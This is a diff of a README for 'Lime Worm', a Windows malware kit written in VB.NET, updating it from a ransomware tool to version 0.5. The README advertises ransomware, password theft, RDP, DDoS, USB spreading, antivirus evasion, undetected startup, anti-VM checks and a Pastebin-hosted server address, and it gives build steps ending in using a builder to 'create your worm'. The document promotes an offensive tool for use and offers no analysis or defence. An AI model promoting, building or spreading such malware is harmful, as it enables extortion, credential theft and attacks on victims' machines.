@@ -1,27 +1,27 @@
-<img src="https://i.imgur.com/gHXUBWY.gif">
+<img src="https://i.imgur.com/4hzwVaa.gif">
 
-# Lime Worm v0.4.4
+# Lime Worm v0.5
 	
- Simple yet powerful ransomware tool for windows
+ Simple yet powerful malware for windows
 
  
 ## Main Features
 
 * Both client and server coded in Visual Basic .NET, Framework 2.0 dependency
  
-* Dual IP / DNS
+* Pastebin IP
 
 * Low AV detection and undetected startup
  
-* Lightweight - About 70 KB
+* Lightweight - About 40 KB
 
-* Passwords recovery , file explorer and also RDP
-
-* Encrypt all files on all drivers
+* Ransomware , passwords recovery , RDP , DDOS
 
 * Spreading over USB drivers
  
- 
+* Anti Virtual Machines 
+
+
 ## Prerequisites
 
 To open project you need:
@@ -33,11 +33,13 @@ To open project you need:
  
 ## Testing
  
-1. Use "Release" compiler in both solution
-2. Execute "Server_0.4\Server_0.4\bin\Release\Lime Worm.exe"
-3. Copy "Client_0.4\Client_0.4\bin\Release\Stub.exe", To "Server_0.4\Server_0.4\bin\Release\Stub\Stub.exe"
-4. Using "Builder" tab, create your worm.
+1. Open "Project\Server_0.5\Lime Worm Project.sln" 
+2. Set Compiler to "Release" mode
+3. On Solution Explorer, Right click on "Solution Lime Worm Project" and press "Rebuild Solution"
+4. Execute "Server_0.5\Server_0.5\bin\Release\Lime Worm.exe"
+5. Using "Builder" tab, create your worm.
  ```
+ This project was tested only on local lab. I do not know if it will work on external lab.
  Server tested on Windows 10, Client tested on virtual machine windows 7
  ```
  
